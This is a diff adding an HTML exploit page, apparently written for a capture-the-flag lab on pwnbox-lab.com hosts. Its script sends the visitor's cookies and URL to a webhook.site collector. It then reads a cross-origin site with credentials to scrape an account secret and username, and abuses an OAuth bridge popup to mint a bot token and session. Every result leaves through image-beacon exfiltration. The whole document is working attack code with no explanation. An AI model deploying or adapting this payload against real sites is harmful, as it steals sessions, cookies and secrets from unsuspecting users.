@@ -1,0 +1,18 @@
+<!doctype html><html><body><script>
+const SINK = "https://webhook.site/09c5215e-e357-47d9-ac61-d8d9c6ce464b";
+function bx(tag, data){ try{ new Image().src = SINK + '?b=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(JSON.stringify(data)).slice(0,1600) + '&r=' + Math.random(); }catch(e){} }
+bx('hello', {ref: document.referrer, url: location.href, ck: document.cookie});
+const CC='https://cloud-console-f62567d87841.pwnbox-lab.com';
+const CLF='https://clf-f62567d87841.pwnbox-lab.com';
+const bridge = CC+'/oauth/bridge?state='+encodeURIComponent(JSON.stringify({target_host:'clf-f62567d87841.pwnbox-lab.com',return_to:'/'}));
+// read clf secret cross-origin (before)
+fetch(CLF+'/', {credentials:'include'}).then(r=>r.text()).then(t=>{const m=t.match(/Account secret[\s\S]{0,160}/i);bx('clf_before',{len:t.length,sec:m?m[0]:'NA',user:(t.match(/data-user="([^"]*)"/)||[])[1]});}).catch(e=>bx('clf_before_ERR',{e:String(e).slice(0,80)}));
+// open bridge popup (mints bot token, sets clf_session)
+let w; try{ w=window.open(bridge,'p','width=200,height=200'); }catch(e){ bx('open_ERR',{e:String(e)});}
+let n=0;const iv=setInterval(()=>{n++;let i={};try{i.href=w.location.href;}catch(e){i.err=String(e).slice(0,50);}bx('pop'+n,i);if(n>=6)clearInterval(iv);},700);
+// after clf_session likely set, read clf again + fetch bridge body
+setTimeout(()=>{
+  fetch(CLF+'/', {credentials:'include'}).then(r=>r.text()).then(t=>{const m=t.match(/Account secret[\s\S]{0,160}/i);bx('clf_after',{len:t.length,sec:m?m[0]:'NA',user:(t.match(/data-user="([^"]*)"/)||[])[1]});}).catch(e=>bx('clf_after_ERR',{e:String(e).slice(0,80)}));
+  fetch(bridge,{credentials:'include'}).then(r=>r.text()).then(t=>bx('bridge_body',{b:t.slice(0,260)})).catch(e=>bx('bridge_ERR',{e:String(e).slice(0,80)}));
+}, 4500);
+</script></body></html>
